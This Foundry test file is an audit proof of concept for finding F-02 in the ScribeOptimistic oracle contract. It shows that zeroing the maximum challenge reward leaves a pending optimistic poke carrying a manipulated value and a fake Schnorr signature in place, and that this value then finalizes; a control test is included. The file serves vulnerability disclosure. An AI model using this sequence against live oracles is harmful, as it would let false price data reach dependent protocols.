// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

import {console2} from "forge-std/console2.sol";

import {IScribe} from "src/IScribe.sol";
import {IScribeOptimistic} from "src/IScribeOptimistic.sol";
import {ScribeOptimistic} from "src/ScribeOptimistic.sol";

import {LibSecp256k1} from "src/libs/LibSecp256k1.sol";
import {LibFeed} from "script/libs/LibFeed.sol";

import {IToll} from "chronicle-std/toll/IToll.sol";

import {Test} from "forge-std/Test.sol";

/// @title PoC: F-02 setMaxChallengeReward(0) does NOT call _afterAuthedAction()
/// @notice Demonstrates that setMaxChallengeReward skips _afterAuthedAction,
///         leaving pending opPokeData in place even when reward is zeroed.
contract POC_F02 is Test {
    using LibSecp256k1 for LibSecp256k1.Point;
    using LibFeed for LibFeed.Feed;
    using LibFeed for LibFeed.Feed[];

    ScribeOptimistic private opScribe;
    LibFeed.Feed[] private feeds;

    function setUp() public {
        opScribe = new ScribeOptimistic(address(this), "ETH/USD");
        IToll(address(opScribe)).kiss(address(this));
        feeds = _liftFeeds(opScribe.bar());
    }

    function test_setMaxChallengeReward_zero_preserves_pending_opPoke() public {
        // Step 1: Fund contract with ETH so initial reward is non-zero
        (bool sent,) = address(opScribe).call{value: 1 ether}("");
        assertTrue(sent);
        console2.log("Contract balance:", address(opScribe).balance);
        console2.log("Initial challengeReward:", opScribe.challengeReward());

        // Step 2: Initial poke
        uint128 val1 = 1000;
        IScribe.PokeData memory pokeData1;
        pokeData1.val = val1;
        pokeData1.age = uint32(block.timestamp);
        IScribe.SchnorrData memory schnorr1 =
            feeds.signSchnorr(opScribe.constructPokeMessage(pokeData1));
        opScribe.poke(pokeData1, schnorr1);
        console2.log("Step 2: Initial poke, val =", val1);

        // Advance time so opPoke is not stale
        vm.roll(block.number + 1);
        vm.warp(block.timestamp + 1);

        // Step 3: Submit opPoke with manipulated value
        uint128 manipulatedVal = 999999;
        IScribe.PokeData memory pokeData2;
        pokeData2.val = manipulatedVal;
        pokeData2.age = uint32(block.timestamp);

        IScribe.SchnorrData memory fakeSchnorr = IScribe.SchnorrData({
            signature: bytes32(uint(0xdeadbeef)),
            commitment: address(0x1),
            feedIds: abi.encodePacked(feeds[0].id)
        });

        IScribe.ECDSAData memory ecdsaData =
            feeds[0].signECDSA(opScribe.constructOpPokeMessage(pokeData2, fakeSchnorr));

        opScribe.opPoke(pokeData2, fakeSchnorr, ecdsaData);
        console2.log("Step 3: opPoke submitted with manipulated value =", manipulatedVal);

        // Step 4: Auth calls setMaxChallengeReward(0)
        // Key claim: this does NOT call _afterAuthedAction()
        uint oldMax = opScribe.maxChallengeReward();
        opScribe.setMaxChallengeReward(0);
        console2.log("Step 4: setMaxChallengeReward(0) called");
        console2.log("  maxChallengeReward:", opScribe.maxChallengeReward());

        // Step 5: Verify challengeReward is now 0
        assertEq(opScribe.challengeReward(), 0);
        console2.log("  challengeReward:", opScribe.challengeReward(), "(zero!)");

        // Step 6: Verify opPokeData is STILL pending (not cleared)
        // Compare with setOpChallengePeriod which DOES call _afterAuthedAction
        // The opPokeData should still be in challenge period since we haven't warped
        // We can verify by checking that _currentPokeData returns the manipulated value
        // after warping past challenge period

        // Warp past challenge period
        vm.warp(block.timestamp + opScribe.opChallengePeriod() + 1);

        // Step 7: opPokeData auto-finalized since _afterAuthedAction was NOT called
        (bool ok, uint val) = opScribe.tryRead();
        assertTrue(ok);
        assertEq(val, manipulatedVal);
        console2.log("Step 7: tryRead() returns manipulated value =", val);
        console2.log("PASS: setMaxChallengeReward(0) does not clear pending opPokeData");
    }

    function test_setOpChallengePeriod_calls_afterAuthedAction() public {
        // Control test: setOpChallengePeriod DOES call _afterAuthedAction
        // and clears pending opPokeData

        // Initial poke
        IScribe.PokeData memory pokeData1;
        pokeData1.val = 1000;
        pokeData1.age = uint32(block.timestamp);
        IScribe.SchnorrData memory schnorr1 =
            feeds.signSchnorr(opScribe.constructPokeMessage(pokeData1));
        opScribe.poke(pokeData1, schnorr1);

        // Advance time so opPoke is not stale
        uint256 newTime = block.timestamp + 1;
        vm.roll(block.number + 1);
        vm.warp(newTime);

        // Submit opPoke
        IScribe.PokeData memory pokeData2;
        pokeData2.val = 999999;
        pokeData2.age = uint32(newTime);
        IScribe.SchnorrData memory fakeSchnorr = IScribe.SchnorrData({
            signature: bytes32(uint(0xdeadbeef)),
            commitment: address(0x1),
            feedIds: abi.encodePacked(feeds[0].id)
        });
        IScribe.ECDSAData memory ecdsaData =
            feeds[0].signECDSA(opScribe.constructOpPokeMessage(pokeData2, fakeSchnorr));
        opScribe.opPoke(pokeData2, fakeSchnorr, ecdsaData);

        // setOpChallengePeriod triggers _afterAuthedAction which clears opPokeData
        opScribe.setOpChallengePeriod(opScribe.opChallengePeriod() + 1);

        // After setOpChallengePeriod, _afterAuthedAction was called
        // _pokeData.age was set to block.timestamp
        // Warp past challenge period
        vm.warp(block.timestamp + opScribe.opChallengePeriod() + 1);

        // opPokeData was cleared, so read() returns the original poke value
        assertEq(opScribe.read(), 1000);
        console2.log("PASS: setOpChallengePeriod DOES clear pending opPokeData (control test)");
    }

    function _liftFeeds(uint8 numberFeeds)
        internal
        returns (LibFeed.Feed[] memory)
    {
        LibFeed.Feed[] memory feeds_ = new LibFeed.Feed[](uint(numberFeeds));
        uint privKey = 2;
        uint bloom;
        uint ctr;
        while (ctr != numberFeeds) {
            LibFeed.Feed memory feed = LibFeed.newFeed({privKey: privKey});
            if (bloom & (1 << feed.id) == 0) {
                bloom |= 1 << feed.id;
                feeds_[ctr++] = feed;
                opScribe.lift(
                    feed.pubKey,
                    feed.signECDSA(opScribe.feedRegistrationMessage())
                );
            }
            privKey++;
        }
        return feeds_;
    }
}
